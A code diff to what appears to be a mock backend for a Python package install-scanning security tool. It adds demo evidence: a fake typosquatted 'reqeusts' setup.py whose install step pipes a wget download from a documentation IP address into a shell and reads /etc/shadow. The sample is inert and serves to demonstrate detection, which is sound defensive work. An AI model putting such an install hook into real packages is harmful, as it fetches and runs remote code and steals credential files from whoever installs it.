@@ -180,6 +180,17 @@ export function installScan(o: Partial<InstallScan> & Pick<InstallScan, 'status'
   return { id: '', version: '', riskScore: null, installThreats: 0, threats: 0, vulnCount: 0, error: '', skip: '', reused: false, ...o };
 }
 const INSTALL_CTR = 'sg-install-pip-1792043525-24739';
+// 11/10 시연 증거의 설치 스크립트(무해한 흉내 — 실제로 내려받거나 읽지 않음, 문서용 주소만)
+const DEMO_SETUP_PY_TEXT = [
+  'from setuptools import setup',
+  'import subprocess',
+  '',
+  '# 시연용 흉내: 설치 중 셸 다운로드 · 계정 파일 읽기',
+  'subprocess.run("wget -q -O- http://203.0.113.7/postinstall.sh | sh", shell=True)',
+  'open("/etc/shadow").read()',
+  'setup(name="reqeusts", version="0.0.1")',
+].join('\n');
+const DEMO_SETUP_PY = { path: '/pkg/reqeusts/setup.py', size: DEMO_SETUP_PY_TEXT.length, truncated: false, content: DEMO_SETUP_PY_TEXT };
 const PYIMG = 'python:3.12-slim';
 
 export class MockBackend {
@@ -698,10 +709,12 @@ export class MockBackend {
           stopped = true;
           session.isolation = { auditId: top, timeline: v.timeline! };
           // R3 11/04: kill 직전 증거(GET /api/evidence?container=) — 로그 3줄 · 파일 변경 2 · 프로세스 2
+          // 11/10: 격리 직전 저장한 설치 스크립트(files) — 무해한 흉내, 문서용 주소(TEST-NET)만
           this.evidence.push({
             id: `ev-${run.id}`, containerId: session.containerId!, containerName: ctr, image: PYIMG, collectedAt: at(), partial: false, durationMs: 295,
             logs: 'Collecting ./reqeusts\nRunning setup.py install\n[demo] shell start', changes: [{ kind: 'A', path: '/tmp/p.sh' }, { kind: 'C', path: '/etc/hosts' }],
             processes: [{ pid: 1, user: 'root', cmd: 'pip install /pkg/reqeusts' }, { pid: 4242, user: 'root', cmd: v.event.args ?? v.event.comm }],
+            files: [DEMO_SETUP_PY],
           });
           finish('isolated', 137);
         }
